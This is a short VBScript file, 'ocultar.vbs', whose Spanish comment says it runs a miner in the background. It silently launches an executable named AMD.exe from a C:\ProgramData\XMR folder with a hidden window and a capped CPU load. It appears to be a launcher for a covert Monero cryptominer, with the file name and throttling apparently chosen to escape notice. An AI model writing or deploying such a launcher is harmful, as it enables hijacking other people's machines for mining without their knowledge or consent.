' ocultar.vbs  (ejecuta el minero en segundo plano)
Dim base, sh, cmd
base = "C:\ProgramData\XMR"

cmd = """" & base & "\AMD.exe"" --config=""" & base & "\config.json"" --log-file=""" & base & "\log.txt"" --no-color --max-cpu-usage=40"

Set sh = CreateObject("Wscript.Shell")
sh.Run "cmd /c " & cmd, 0, False